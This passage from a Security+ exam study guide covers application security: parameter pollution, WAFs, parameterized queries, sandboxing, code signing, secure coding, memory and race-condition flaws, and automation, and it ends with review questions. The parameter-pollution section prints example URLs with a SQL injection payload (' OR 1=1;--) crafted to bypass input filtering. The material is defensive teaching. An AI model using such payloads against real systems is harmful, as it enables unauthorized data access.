<p id="c06-para-0164">Input validation techniques are the go-to standard for protecting against injection attacks. However, it's important to understand that attackers have historically discovered ways to bypass almost every form of security control. <i>Parameter pollution</i> is one technique that attackers have successfully used to defeat input validation controls.</p>
<p>Parameter pollution works by sending a web application more than one value for the same input variable. For example, a web application might have a variable named <code>account</code> that is specified in a URL like this:</p>
<pre id="c06-code-0026"><code><a href="http://www.mycompany.com/status.php?account=12345">www.mycompany.com/status.php?account=12345</a></code></pre>
<p>An attacker might try to exploit this application by injecting SQL code into the application:</p>
<pre id="c06-code-0027"><code><a href="http://www.mycompany.com/status.php?account=12345">www.mycompany.com/status.php?account=12345</a>' OR 1=1;--</code></pre>
<p>However, this string looks quite suspicious to a web application firewall and would likely be blocked. An attacker seeking to obscure the attack and bypass content filtering mechanisms might instead send a command with two different values for <code>account</code>:</p>
<pre id="c06-code-0028"><code><a href="http://www.mycompany.com/status.php?account=12345&amp;account=12345">www.mycompany.com/status.php?account=12345&amp;account=12345</a>' OR 1=1;--</code></pre>
<p id="c06-para-0171">This approach relies on the premise that the web platform won't handle this URL properly. It might perform input validation on only the first argument but then execute the second argument, allowing the injection attack to slip through the filtering technology.</p>
<p id="c06-para-0172">Parameter pollution attacks depend on defects in web platforms that don't handle multiple copies of the same parameter properly. These vulnerabilities have been around for a while, and most modern platforms are defended against them, but successful parameter pollution attacks still occur today due to unpatched systems or insecure custom code.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section> <span aria-label="170" epub:type="pagebreak" id="Page_170" role="doc-pagebreak"/>
<section><span id="c06-sec-0062"/>
<h3 id="head-3-78">Web Application Firewalls</h3>
<p id="c06-para-0173"><i>Web application firewalls (WAFs)</i> also play an important role in protecting web applications against attack. Though developers should always rely on input validation as their primary defense against injection attacks, the reality is that applications still sometimes contain injection flaws. This can occur when developer testing is insufficient or when vendors do not promptly supply patches to vulnerable applications.</p>
<p id="c06-para-0174">WAFs function similarly to network firewalls, but they work at the Application layer. A WAF sits in front of a web server, as shown in <a href="#c06-fig-0014" id="R_c06-fig-0014">Figure 6.14</a>, and receives all network traffic headed to that server. It then scrutinizes the input headed to the application, performing input validation before passing the input to the web server. This prevents malicious traffic from ever reaching the web server and acts as an important component of a layered defense against web application vulnerabilities.</p>
<figure> <img alt="An illustration of a web application firewall. It includes Internet, Network Firewall, Internal Network, Screened Subnet, Web Application Firewall, and Web Server." class="center" src="images/c06f014.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0014" id="c06-fig-0014" role="doc-backlink"><b>FIGURE 6.14</b></a></span> Web application firewall</p>
</figcaption>
</figure>
</section>
<section><span id="c06-sec-0063"/>
<h3 id="head-3-79">Parameterized Queries</h3>
<p id="c06-para-0176">Parameterized queries offer another technique to protect applications against injection attacks. In a parameterized query, the client does not directly send SQL code to the database <span aria-label="171" epub:type="pagebreak" id="Page_171" role="doc-pagebreak"/>server. Instead, the client sends arguments to the server, which then inserts those arguments into a precompiled query template. This approach protects against injection attacks and also improves database performance.</p>
<p id="c06-para-0177"><i>Stored procedures</i> are an example of an implementation of parameterized queries used by some database platforms.</p>
</section>
<section><span id="c06-sec-0064"/>
<h3 id="head-3-80">Sandboxing</h3>
<p id="c06-para-0178"><i>Sandboxing</i> is the practice of running an application in a controlled or isolated environment to prevent it from interacting negatively with other system resources or applications. This technique is particularly effective in mitigating the impact of any potential threats or vulnerabilities that might emerge from the application.</p>
<p id="c06-para-0179">In a sandboxed environment, an application operates with restricted permissions and access to system resources. For instance, a sandboxed application may be limited in its ability to read/write files, interact with the operating system, or communicate with other applications. This reduces the possibility of a malicious application or a compromised one from causing broader damage to the system.</p>
<p id="c06-para-0180">This method of isolation can be particularly useful when testing new or untrusted software. If the software proves to be malicious or simply unstable, it can be easily contained and removed without affecting the overall system. Furthermore, sandboxing is a great tool for developers, enabling them to debug and test code in a safe, controlled environment before deploying it into production.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0010"/>
<h3 id="head-2-84">Exam Note</h3>
<section><span id="c06-sec-0065"/>
<p id="c06-para-0181">Sandboxes are isolation tools used to contain attackers within an environment where they believe they are conducting an attack but, in reality, are operating in a benign environment.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
<section><span id="c06-sec-0066"/>
<h3 id="head-3-81">Code Security</h3>
<p id="c06-para-0182">Software developers should also take steps to safeguard the creation, storage, and delivery of their code. They do this through a variety of techniques.</p>
<section><span id="c06-sec-0067"/>
<h4 id="head-4-57">Code Signing</h4>
<p id="c06-para-0183"><i>Code signing</i> provides developers with a way to confirm the authenticity of their code to end users. Developers use a cryptographic function to digitally sign their code with their own private key and then browsers can use the developer's public key to verify that signature and ensure that the code is legitimate and was not modified by unauthorized individuals. In cases where there is a lack of code signing, users may inadvertently run inauthentic code.</p>
<p id="c06-para-0184"><span aria-label="172" epub:type="pagebreak" id="Page_172" role="doc-pagebreak"/>Code signing protects against <i>malicious updates</i>, where an attacker attempts to deploy a fake patch that actually undermines the security of an application or operating system. If systems only accept digitally signed updates, a malicious update would fail that check and be rejected by the target system.</p>
</section>
<section><span id="c06-sec-0068"/>
<h4 id="head-4-58">Code Reuse</h4>
<p id="c06-para-0185">Many organizations reuse code not only internally but by making use of third-party software libraries and software development kits (SDKs). Third-party software libraries are a common way to share code among developers.</p>
<p id="c06-para-0186">Libraries consist of shared code objects that perform related functions. For example, a software library might contain a series of functions related to biology research, financial analysis, or social media. Instead of having to write the code to perform every detailed function they need, developers can simply locate libraries that contain relevant functions and then call those functions.</p>
<p id="c06-para-0187">Organizations trying to make libraries more accessible to developers often publish SDKs. SDKs are collections of software libraries combined with documentation, examples, and other resources designed to help programmers get up and running quickly in a development environment. SDKs also often include specialized utilities designed to help developers design and test code.</p>
<p id="c06-para-0188">Organizations may also introduce third-party code into their environments when they outsource code development to other organizations. Security teams should ensure that outsourced code is subjected to the same level of testing as internally developed code.</p>
<p id="c06-para-0189">Security professionals should be familiar with the various ways that third-party code is used in their organizations as well as the ways that their organization makes services available to others. It's fairly common for security flaws to arise in shared code, making it extremely important to know these dependencies and remain vigilant about security updates.</p>
</section>
<section><span id="c06-sec-0069"/>
<h4 id="head-4-59">Software Diversity</h4>
<p id="c06-para-0190">Security professionals seek to avoid single points of failure in their environments to avoid availability risks if an issue arises with a single component. This is also true for software development. Security professionals should watch for places in the organization that are dependent on a single piece of source code, binary executable files, or compilers. Though eliminating all of these dependencies may not be possible, tracking them is a critical part of maintaining a secure codebase.</p>
</section>
<section><span id="c06-sec-0070"/>
<h4 id="head-4-60">Code Repositories</h4>
<p id="c06-para-0191"><i>Code repositories</i> are centralized locations for the storage and management of application source code. The main purpose of a code repository is to store the source files used in software development in a centralized location that allows for secure storage and the coordination of changes among multiple developers.</p>
<p id="c06-para-0192">Code repositories also perform <i>version control</i>, allowing the tracking of changes and the rollback of code to earlier versions when required. Basically, code repositories perform <span aria-label="173" epub:type="pagebreak" id="Page_173" role="doc-pagebreak"/>the housekeeping work of software development, making it possible for many people to share work on a large software project in an organized fashion. They also meet the needs of security and auditing professionals who want to ensure that software development includes automated auditing and logging of changes.</p>
<p id="c06-para-0193">By exposing code to all developers in an organization, code repositories promote code reuse. Developers seeking code to perform a particular function can search the repository for existing code and reuse it rather than start from ground zero.</p>
<p id="c06-para-0194">Code repositories also help avoid the problem of <i>dead code</i>, where code is in use in an organization but nobody is responsible for the maintenance of that code and, in fact, nobody may even know where the original source files reside.</p>
</section>
<section><span id="c06-sec-0071"/>
<h4 id="head-4-61">Integrity Measurement</h4>
<p id="c06-para-0195">Code repositories are an important part of application security but are only one aspect of code management. Cybersecurity teams should also work hand in hand with developers and operations teams to ensure that applications are provisioned and deprovisioned in a secure manner through the organization's approved release management process.</p>
<p id="c06-para-0196">This process should include code integrity measurement. Code integrity measurement uses cryptographic hash functions to verify that the code being released into production matches the code that was previously approved. Any deviation in hash values indicates that code was modified, either intentionally or unintentionally, and requires further investigation prior to release.</p>
</section>
<section><span id="c06-sec-0072"/>
<h4 id="head-4-62">Application Resilience</h4>
<p>When we design applications, we should create them in a manner that makes them resilient in the face of changing demand. We do this through the application of two related principles:</p>
<ul class="square" id="c06-list-0020">
<li id="c06-li-0054"><i>Scalability</i> says that applications should be designed so that computing resources they require may be incrementally added to support increasing demand.</li>
<li id="c06-li-0055"><i>Elasticity</i> goes a step further than scalability and says that applications should be able to provision resources automatically to scale when necessary and then automatically deprovision those resources to reduce capacity (and cost) when it is no longer needed.</li>
</ul>
</section>
</section>
</section>
<section aria-labelledby="head-2-85"><span id="c06-sec-0073"/>
<h2 id="head-2-85">Secure Coding Practices</h2>
<p id="c06-para-0198">A multitude of development styles, languages, frameworks, and other variables may be involved in the creation of an application, but many of the security issues are the same regardless of which you use. In fact, despite many development frameworks and languages providing security features, the same security problems continue to appear in applications all the time! Fortunately, a number of common best practices are available that you can use to help ensure software security for your organization.</p> <span aria-label="174" epub:type="pagebreak" id="Page_174" role="doc-pagebreak"/>
<section><span id="c06-sec-0074"/>
<h3 id="head-3-82">Source Code Comments</h3>
<p id="c06-para-0199">Comments are an important part of any good developer's workflow. Placed strategically throughout code, they provide documentation of design choices, explain workflows, and offer details crucial to other developers who may later be called on to modify or troubleshoot the code. When placed in the right hands, comments are crucial.</p>
<p id="c06-para-0200">However, comments can also provide attackers with a roadmap explaining how code works. In some cases, comments may even include critical security details that should remain secret. Developers should take steps to ensure that commented versions of their code remain secret. In the case of compiled code, this is unnecessary, as the compiler automatically removes comments from executable files. However, web applications that expose their code may allow remote users to view comments left in the code. In those environments, developers should remove comments from production versions of the code before deployment. It's fine to leave the comments in place for archived source code as a reference for future developers—just don't leave them accessible to unknown individuals on the Internet!</p>
</section>
<section><span id="c06-sec-0075"/>
<h3 id="head-3-83">Error Handling</h3>
<p>Attackers thrive on exploiting errors in code. Developers must understand this and write their code so that it is resilient to unexpected situations that an attacker might create in order to test the boundaries of code. For example, if a web form requests an age as input, it's insufficient to simply verify that the age is an integer. Attackers might enter a 50,000-digit integer in that field in an attempt to perform an integer overflow attack. Developers must anticipate unexpected situations and write <i>error handling</i> code that steps in and handles these situations in a secure fashion. Improper error handling may expose code to unacceptable levels of risk.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0202"><img alt="" role="presentation" src="images/note.png"/> If you're wondering why you need to worry about error handling when you already perform input validation, remember that cybersecurity professionals embrace a defense-in-depth approach to security. For example, your input validation routine might itself contain a flaw that allows potentially malicious input to pass through to the application. Error handling serves as a secondary control in that case, preventing the malicious input from triggering a dangerous error condition.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0203">On the flip side of the error handling coin, overly verbose error handling routines may also present risk. If error handling routines explain too much about the inner workings of code, they may allow an attacker to find a way to exploit the code. For example, <a href="#c06-fig-0015" id="R_c06-fig-0015">Figure 6.15</a> shows an error message appearing on a French website that contains details of the SQL query used to create the web page. You don't need to speak French to understand that this could allow an attacker to determine the table structure and attempt a SQL injection attack!</p> <span aria-label="175" epub:type="pagebreak" id="Page_175" role="doc-pagebreak"/>
<figure> <img alt="A snapshot of S Q L error disclosure. The texts are in other languages. The options include contenu de la requete and erreur retournee." class="center" src="images/c06f015.png"/>
<figcaption>
<p><span class="figureLabel"><a href="#R_c06-fig-0015" id="c06-fig-0015" role="doc-backlink"><b>FIGURE 6.15</b></a></span> SQL error disclosure</p>
</figcaption>
</figure>
</section>
<section><span id="c06-sec-0077"/>
<h3 id="head-3-84">Hard-Coded Credentials</h3>
<p id="c06-para-0204">In some cases, developers may include usernames and passwords in the source code. There are two variations of this error. First, the developer may create a hard-coded maintenance account for the application that allows the developer to regain access even if the authentication system fails. This is known as a <i>backdoor</i> vulnerability and is problematic because it allows anyone who knows the backdoor password to bypass normal authentication and gain access to the system. If the backdoor becomes publicly (or privately!) known, all copies of the code in production are compromised.</p>
<p id="c06-para-0205">The second variation of hard-coding credentials occurs when developers include access credentials for other services within their source code. If that code is intentionally or accidentally disclosed, those credentials then become known to outsiders. This occurs quite often when developers accidentally publish code to a public code repository, such as GitHub, that contains API keys or other hard-coded credentials.</p>
</section>
<section><span id="c06-sec-0078"/>
<h3 id="head-3-85">Package Monitoring</h3>
<p id="c06-para-0206">Modern development environments often rely heavily on third-party libraries and packages. Developers often use them to save time and effort, but this practice can introduce vulnerabilities if those libraries contain insecure code or become compromised.</p>
<p id="c06-para-0207"><i>Package monitoring</i> involves keeping track of all the third-party libraries or packages used in your organization, understanding what they do, and being aware of any potential vulnerabilities they may have. It includes regularly updating these dependencies to ensure you are using the most secure, up-to-date versions of third-party packages. Automated tools can help with this process by identifying outdated or insecure dependencies and notifying developers when updates or patches become available.</p>
<p id="c06-para-0208">It’s also important to understand the trustworthiness and reputation of the sources of these packages. Using a package from an untrusted source can lead to introducing vulnerabilities into your application. Only trusted repositories should be used, and any suspicious activity related to a package should be investigated thoroughly.</p>
</section> <span aria-label="176" epub:type="pagebreak" id="Page_176" role="doc-pagebreak"/>
<section><span id="c06-sec-0079"/>
<h3 id="head-3-86">Memory Management</h3>
<p id="c06-para-0209">Applications are often responsible for managing their own use of memory, and in those cases, poor memory management practices can undermine the security of the entire system.</p>
<section><span id="c06-sec-0080"/>
<h4 id="head-4-63">Resource Exhaustion</h4>
<p id="c06-para-0210">One of the issues that we need to watch for with memory or any other limited resource on a system is <i>resource exhaustion</i>. Whether intentional or accidental, systems may consume all of the memory, storage, processing time, or other resources available to them, rendering the system disabled or crippled for other uses.</p>
<p id="c06-para-0211"><i>Memory leaks</i> are one example of resource exhaustion. If an application requests memory from the operating system, it will eventually no longer need that memory and should then return the memory to the operating system for other uses. In the case of an application with a memory leak, the application fails to return some memory that it no longer needs, perhaps by simply losing track of an object that it has written to a reserved area of memory. If the application continues to do this over a long period of time, it can slowly consume all the memory available to the system, causing it to crash. Rebooting the system often resets the problem, returning the memory to other uses, but if the memory leak isn't corrected, the cycle simply begins anew.</p>
</section>
<section><span id="c06-sec-0081"/>
<h4 id="head-4-64">Pointer Dereferencing</h4>
<p id="c06-para-0212"><i>Memory pointers</i> can also cause security issues. Pointers are a commonly used concept in application development. They are simply an area of memory that stores an address of another location in memory.</p>
<p id="c06-para-0213">For example, we might have a pointer called photo that contains the address of a location in memory where a photo is stored. When an application needs to access the actual photo, it performs an operation called pointer dereferencing. This simply means that the application follows the pointer and accesses the memory referenced by the pointer address. There's nothing unusual with this process. Applications do it all the time.</p>
<p id="c06-para-0214">One particular issue that might arise is if the pointer is empty, containing what programmers call a null value. If the application tries to dereference this null pointer, it causes a condition known as a null pointer exception. In the best case, a null pointer exception causes the program to crash, providing an attacker with access to debugging information that may be used for reconnaissance of the application's security. In the worst case, a null pointer exception may allow an attacker to bypass security controls. Security professionals should work with application developers to help them avoid these issues.</p>
</section>
<section><span id="c06-sec-0082"/>
<h4 id="head-4-65">Buffer Overflows</h4>
<p id="c06-para-0215"><i>Buffer overflow</i> attacks occur when an attacker manipulates a program into placing more data into an area of memory than is allocated for that program's use. The goal is to overwrite other information in memory with instructions that may be executed by a different process running on the system. This technique of maliciously inserting information into memory is known as <i>memory injection</i>, and it is the primary goal of a buffer overflow attack.</p>
<p><span aria-label="177" epub:type="pagebreak" id="Page_177" role="doc-pagebreak"/>Buffer overflow attacks are quite commonplace and tend to persist for many years after they are initially discovered. In a recent study of breaches, four of the top 10 issues causing breaches were exploits of overflow vulnerabilities that were between 12 and 16 years old!</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3">
<p id="c06-para-0217"><img alt="" role="presentation" src="images/note.png"/> One of the listed vulnerabilities is an “integer overflow.” This is simply a variant of a buffer overflow where the result of an arithmetic operation attempts to store an integer that is too large to fit in the specified buffer.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
<p id="c06-para-0218">Cybersecurity analysts discovering a buffer overflow vulnerability during a vulnerability scan should seek out a patch that corrects the issue. In most cases, the scan report will directly identify an available patch.</p>
</section>
</section>
<section><span id="c06-sec-0084"/>
<h3 id="head-3-87">Race Conditions</h3>
<p><i>Race conditions</i> occur when the security of a code segment depends upon the sequence of events occurring within the system. You should be familiar with three important terms related to race conditions:</p>
<ul class="square" id="c06-list-0021">
<li id="c06-li-0056"><i>Time-of-Check (TOC)</i> is the instance when a system verifies access permissions or other security controls.</li>
<li id="c06-li-0057"><i>Time-of-Use (TOU)</i> is the moment when the system accesses the resource or uses the permission that was granted.</li>
<li id="c06-li-0058">The <i>Target of Evaluation (TOE)</i> refers to the particular component, system, or mechanism being evaluated or tested for potential vulnerabilities, such as the system's method of managing and validating access permissions.</li>
</ul>
<p id="c06-para-0220">A <i>Time-of-Check-to-Time-of-Use (TOCTTOU or TOC/TOU)</i> issue is a type of race condition that occurs when a program checks access permissions too far ahead of a resource request. For example, if an operating system builds a comprehensive list of access permissions for a user upon logon and then consults that list throughout the logon session, a TOCTTOU vulnerability exists. If the systems administrator revokes a particular permission, that restriction would not be applied to the user until the next time they log on. If the user is logged on when the access revocation takes place, they will have access to the resource indefinitely. The user simply needs to leave the session open for days, and the new restrictions will never be applied. To prevent this race condition, the developer should evaluate access permissions at the time of each request rather than caching a listing of permissions.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0011"/>
<h3 id="head-2-86">Exam Note</h3>
<section><span id="c06-sec-0085"/>
<p id="c06-para-0221">Buffer overflow vulnerabilities attempt to use more space than is allocated for a purpose and allow the attacker to perform memory injection, inserting their own content into sensitive memory locations. Race conditions occur when the security of a code segment depends on the sequence of events occurring within the system.</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section> <span aria-label="178" epub:type="pagebreak" id="Page_178" role="doc-pagebreak"/>
<section><span id="c06-sec-0086"/>
<h3 id="head-3-88">Unprotected APIs</h3>
<p id="c06-para-0222">Organizations often want other developers to build on the platforms that they have created. For example, Twitter and Facebook might want to allow third-party application developers to create apps that post content to the user's social media feeds. To enable this type of innovation, services often create <i>application programming interfaces (APIs)</i> that enable automated access.</p>
<p id="c06-para-0223">If not properly secured, unprotected APIs may lead to the unauthorized use of functions. For example, an API that does not use appropriate authentication may allow anyone with knowledge of the API URLs to modify a service. APIs that are not intended for public use should always be secured with an authentication mechanism, such as an API key, and accessed only over encrypted channels that protect those credentials from eavesdropping attacks.</p>
</section>
</section>
<section aria-labelledby="head-2-87"><span id="c06-sec-0087"/>
<h2 id="head-2-87">Automation and Orchestration</h2>
<p id="c06-para-0224">Standardizing tasks also helps you identify opportunities for automation. You may be able to go beyond standardizing the work of team members and automate some responses to take people out of the loop entirely. <i>Security orchestration, automation, and response (SOAR)</i> platforms provide many opportunities to automate security tasks that cross between multiple systems. You may wish to coordinate with other members of your team, taking an inventory of all the activities performed by the team and identifying those that are suitable for automation. The two key characteristics of processes that can be automated are that they are both repeatable and do not require human interaction. Once you have automations in place, you'll just need to coordinate with your team to manage existing automations and facilitate the adoption of new automations.</p>
<p id="c06-para-0225">SOAR platforms also offer opportunities to improve your organization's use of threat intelligence. By bringing information about emerging threats into your SOAR platform, you can enrich data about ongoing incidents and improve your ability to react to emerging cybersecurity situations. The SOAR platform provides you with the opportunity to combine information received through multiple threat feeds and develop a comprehensive picture of the cybersecurity landscape and your security posture.</p>
<p id="c06-para-0226">Cybersecurity professionals also use <i>scripting</i> to achieve their automation goals. Scripting languages, such as Python, Bash, or PowerShell, can be instrumental in automating repetitive tasks and streamlining security operations. For instance, scripts can be written to automate log analysis, network scanning, or alert responses, thereby minimizing manual intervention and increasing the efficiency of your security team.</p> <span aria-label="179" epub:type="pagebreak" id="Page_179" role="doc-pagebreak"/>
<section><span id="c06-sec-0088"/>
<h3 id="head-3-89">Use Cases of Automation and Scripting</h3>
<p>In the ever-evolving landscape of cybersecurity, automation and scripting are powerful tools that can significantly improve efficiency and security. This section presents a number of practical use cases where these tools can be applied in various aspects of IT operations.</p>
<ul class="square" id="c06-list-0022">
<li id="c06-li-0059"><b>User provisioning:</b> Automated scripts can handle the process of adding, modifying, or removing user access to systems and networks, reducing manual efforts and human error.</li>
<li id="c06-li-0060"><b>Resource provisioning:</b> Scripts can automate the allocation and deallocation of system resources, ensuring optimal performance and reducing the burden on IT staff.</li>
<li id="c06-li-0061"><b>Guard rails:</b> Automation can be employed to enforce policy controls and prevent violations of security protocols.</li>
<li id="c06-li-0062"><b>Security groups:</b> Automated processes can manage security group memberships, ensuring users have appropriate permissions.</li>
<li id="c06-li-0063"><b>Ticket creation:</b> Automation can streamline the ticketing process, enabling immediate creation and routing of issues to the right teams.</li>
<li id="c06-li-0064"><b>Escalation:</b> In case of a major incident, scripts can automate the escalation process, alerting key personnel quickly.</li>
<li id="c06-li-0065"><b>Enabling/disabling services and access:</b> Automation can be used to turn services or access on or off based on certain triggers or conditions.</li>
<li id="c06-li-0066"><b>Continuous integration and testing:</b> Scripts can automate the build and test process, ensuring faster and more reliable software delivery.</li>
<li id="c06-li-0067"><b>Integrations and APIs:</b> Automated processes can handle data exchange between different software applications through APIs, enhancing interoperability.</li>
</ul>
</section>
<section><span id="c06-sec-0089"/>
<h3 id="head-3-90">Benefits of Automation and Scripting</h3>
<p>Embracing automation and scripting in cybersecurity practices comes with a host of benefits. These advantages range from enhancing operational efficiency and enforcing security standards to reducing reaction time and aiding in workforce management. Let's look at some of the key benefits of automation and scripting:</p>
<ul class="square" id="c06-list-0023">
<li id="c06-li-0068"><b>Achieving efficiency and time savings:</b> Automation reduces manual tasks, allowing team members to focus on higher-level tasks.</li>
<li id="c06-li-0069"><b>Enforcing baselines:</b> Automation ensures consistent application of security baselines across systems and networks.</li>
<li id="c06-li-0070"><b>Standardizing infrastructure configurations:</b> Scripts can automate the process of configuring systems, ensuring uniformity and reducing errors.</li>
<li id="c06-li-0071"><b>Scaling in a secure manner:</b> Automation supports rapid scaling of infrastructure while maintaining security controls.</li>
<li id="c06-li-0072"><span aria-label="180" epub:type="pagebreak" id="Page_180" role="doc-pagebreak"/><b>Retaining employees:</b> Automation of mundane tasks can increase job satisfaction and employee retention.</li>
<li id="c06-li-0073"><b>Reducing reaction time:</b> Automated alerts and responses can significantly reduce the time to react to security incidents.</li>
<li id="c06-li-0074"><b>Serving as a workforce multiplier:</b> Automation increases the capacity of your team by handling repetitive tasks, effectively acting as a force multiplier.</li>
</ul>
</section>
<section><span id="c06-sec-0090"/>
<h3 id="head-3-91">Other Considerations</h3>
<p>While the benefits of automation and scripting are significant, it's also essential to be aware of potential challenges or considerations that might arise during the implementation process. Here are some of the important considerations:</p>
<ul class="square" id="c06-list-0024">
<li id="c06-li-0075"><b>Complexity:</b> While automation can simplify many processes, the development and management of automation scripts can be complex and require a high level of technical skill.</li>
<li id="c06-li-0076"><b>Cost:</b> Implementing automation and scripting often involves upfront costs, including investment in tools, training, and potentially new staff members with specific expertise.</li>
<li id="c06-li-0077"><b>Single point of failure:</b> Over-reliance on automation might lead to a single point of failure where one malfunctioning script or process could impact a significant part of your operations.</li>
<li id="c06-li-0078"><b>Technical debt:</b> Over time, as systems evolve and change, automated scripts might become outdated or inefficient, creating a form of “technical debt” that needs to be addressed.</li>
<li id="c06-li-0079"><b>Ongoing supportability:</b> Maintaining and updating scripts to ensure they remain effective and compatible with your systems is a continual task that requires dedicated resources.</li>
</ul>
<p id="c06-para-0230">While automation and scripting offer powerful tools for enhancing cybersecurity, it's important to carefully consider these potential challenges alongside the benefits described in the previous section. With proper planning and management, you can mitigate these risks and maximize the benefits of automation in your cybersecurity operations.</p>
<section>
<aside>
<div class="top hr"><hr/></div>
<section class="feature3"><span id="c06-fea-0012"/>
<h3 id="head-2-88">Exam Note</h3>
<section><span id="c06-sec-0091"/>
<p id="c06-para-0231">The use cases, benefits, and other considerations for automation and scripting listed in the previous sections are taken directly from the Security+ exam objectives. These bulleted lists are good material to memorize as you prepare for the exam!</p>
</section>
<div class="bottom hr"><hr/></div>
</section>
</aside>
</section>
</section>
</section> <span aria-label="181" epub:type="pagebreak" id="Page_181" role="doc-pagebreak"/>
<section aria-labelledby="head-2-89"><span id="c06-sec-0092"/>
<h2 id="head-2-89">Summary</h2>
<p id="c06-para-0232">Software plays an integral role in every organization, performing tasks ranging from financial transactions to the management of sensitive physical infrastructure components. Cybersecurity professionals must ensure that the software used in their environment undergoes rigorous testing to determine whether it meets business requirements and does not expose the organization to serious cybersecurity risks.</p>
<p id="c06-para-0233">Achieving this goal requires a strong understanding of the different types of vulnerabilities that may arise in source code and in the deployment of client-server and web applications. In this chapter, you learned about many of these vulnerabilities and the tools used to manage software security risks.</p>
</section>
<section aria-labelledby="head-2-90"><span id="c06-sec-0093"/>
<h2 id="head-2-90">Exam Essentials</h2>

<p id="c06-li-0080"><b>Understand secure software development concepts.</b> Software should be created using a standardized software development life cycle that moves software through development, test, staging, and production environments. Developers should understand the issues associated with code reuse and software diversity. Web applications should be developed in alignment with industry-standard principles such as those developed by the Open Worldwide Application Security Project (OWASP).</p>
<p id="c06-li-0081"><b>Know how to analyze the indicators associated with application attacks.</b> Software applications may suffer from a wide range of vulnerabilities that make them susceptible to attack. You should be familiar with these attacks, including memory injection, buffer overflow, and race condition attacks. You should also understand web-specific attacks, such as Structured Query Language injection (SQLi) and cross-site scripting (XSS). Understanding the methods behind these attacks helps security professionals build adequate defenses and identify attacks against their organizations.</p>
<p id="c06-li-0082"><b>Know how to implement application security controls.</b> Application security should be at the forefront of security operations principles. This includes protecting code through the use of input validation. Web applications that rely on cookies for session management should secure those cookies through the use of transport encryption. Code should be routinely subjected to code review as well as static and dynamic testing. Code signing provides end users with assurance that code came from a trusted source. Sandboxing allows the testing of code in an isolated environment.</p>
<p id="c06-li-0083"><b>Explain the common benefits and drawbacks of automation and scripting related to secure operations.</b> The main benefits of automation are achieving efficiency and saving time, enforcing baselines, standardizing infrastructure configurations, scaling in a secure manner, retaining employees, lowering reaction times, and serving as a workforce multiplier. The <span aria-label="182" epub:type="pagebreak" id="Page_182" role="doc-pagebreak"/>main drawbacks are complexity, cost, creating a single point of failure, building up technical debt, and maintaining ongoing supportability.</p>
<p id="c06-li-0084"><b>Explain common use cases of automation and scripting for cybersecurity.</b> Security professionals use automation and scripting techniques in many different use cases. These include user and resource provisioning, creating guard rails, managing security groups, creating and escalating tickets, enabling and disabling services and access, performing continuous integration and testing, and making use of application programming interfaces (APIs).</p>

</section> <span aria-label="183" epub:type="pagebreak" id="Page_183" role="doc-pagebreak"/>
<section aria-labelledby="head-2-91"><span id="c06-sec-0094"/>
<h2 id="head-2-91">Review Questions</h2>
<section><span id="c06-exsec-0001"/>
<ol class="decimal">
<li id="c06-ex-0001">Adam is conducting software testing by reviewing the source code of the application. What type of code testing is Adam conducting?
<ol class="upper-alpha">
<li>Mutation testing</li>
<li>Static code analysis</li>
<li>Dynamic code analysis</li>
<li>Fuzzing</li>
</ol>
</li>
<li id="c06-ex-0002">Charles is worried about users conducting SQL injection attacks. Which of the following solutions will best address his concerns?
<ol class="upper-alpha">
<li>Using secure session management</li>
<li>Enabling logging on the database</li>
<li>Performing user input validation</li>
<li>Implementing TLS</li>
</ol>
</li>
<li id="c06-ex-0003">Precompiled SQL statements that only require variables to be input are an example of what type of application security control?
<ol class="upper-alpha">
<li>Parameterized queries</li>
<li>Encoding data</li>
<li>Input validation</li>
<li>Appropriate access controls</li>
</ol>
</li>
<li id="c06-ex-0004">During a web application test, Ben discovers that the application shows SQL code as part of an error provided to application users. What should he note in his report?
<ol class="upper-alpha">
<li>Improper error handling</li>
<li>Code exposure</li>
<li>SQL injection</li>
<li>A default configuration issue</li>
</ol>
</li>
<li id="c06-ex-0005">The application that Scott is writing has a flaw that occurs when two operations are attempted at the same time, resulting in unexpected results when the two actions do not occur in the expected order. What type of flaw does the application have?
<ol class="upper-alpha">
<li>Dereferencing</li>
<li>A race condition</li>
<li>An insecure function</li>
<li>Improper error handling</li>
</ol>
</li>
<li id="c06-ex-0006"><span aria-label="184" epub:type="pagebreak" id="Page_184" role="doc-pagebreak"/> Every time Susan checks code into her organization's code repository, it is tested and validated, and then if accepted, it is immediately put into production. What is the term for this?
<ol class="upper-alpha">
<li>Continuous integration</li>
<li>Continuous delivery</li>
<li>A security nightmare</li>
<li>Agile development</li>
</ol>
</li>
<li id="c06-ex-0007">Tim is working on a change to a web application used by his organization to fix a known bug. What environment should he be working in?
<ol class="upper-alpha">
<li>Test</li>
<li>Development</li>
<li>Staging</li>
<li>Production</li>
</ol>
</li>
<li id="c06-ex-0008">Ricky is concerned that developers in his organization make use of third-party code in their applications, which may introduce unknown vulnerabilities. He is concerned about the risk of the organization running code that it is not aware it is using. Which one of the following activities would best address this risk?
<ol class="upper-alpha">
<li>Web application firewalls</li>
<li>Package monitoring</li>
<li>Static analysis</li>
<li>Dynamic analysis</li>
</ol>
</li>
<li id="c06-ex-0009">Which one of the following is not an advantage of automation in cybersecurity operations?
<ol class="upper-alpha">
<li>Enforcing baselines</li>
<li>Technical debt</li>
<li>Employee retention</li>
<li>Standardizing infrastructure configurations</li>
</ol>
</li>
<li id="c06-ex-0010">Chris is creating a script that will automatically screen any user requests and flag those that exceed normal thresholds for manual review. What term best describes this automation use case?
<ol class="upper-alpha">
<li>User provisioning</li>
<li>Guard rails</li>
<li>Ticket creation</li>
<li>Escalation</li>
</ol>
</li>
<li id="c06-ex-0011"><span aria-label="185" epub:type="pagebreak" id="Page_185" role="doc-pagebreak"/> Which one of the following is not a common drawback of automating cybersecurity operations?
<ol class="upper-alpha">
<li>Reducing employee satisfaction</li>
<li>Creating single points of failure</li>
<li>Costs</li>
<li>Complexity</li>
</ol>
</li>
